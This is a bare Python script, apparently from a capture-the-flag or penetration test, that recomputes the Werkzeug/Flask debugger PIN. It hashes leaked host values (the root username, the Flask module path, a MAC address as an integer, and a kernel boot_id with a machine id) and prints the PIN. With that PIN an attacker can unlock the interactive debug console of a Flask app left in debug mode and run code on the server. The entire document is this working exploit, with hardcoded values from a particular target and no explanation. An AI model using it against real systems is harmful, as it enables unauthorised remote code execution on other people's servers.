import hashlib
from itertools import chain
probably_public_bits = [
        'root',# username
        'flask.app',# modname
        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
        '2485377892358',# str(uuid.getnode()),  /sys/class/net/eth0/address
        b'718bbbbc-f717-4e12-a421-460219522bcc7b11d1aede0f98786c93ef4d76f7deb1aeaac1690cd833414ea6ac717ed59f37'# /proc/sys/kernel/random/boot_id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
        if not bit:
                continue
        if isinstance(bit, str):
                bit = bit.encode('utf-8')
        h.update(bit)
h.update(b'cookiesalt')
cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
        h.update(b'pinsalt')
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

rv =None
if rv is None:
        for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                        rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                                  for x in range(0, len(num), group_size))
                        break
        else:
                rv = num

print(rv)
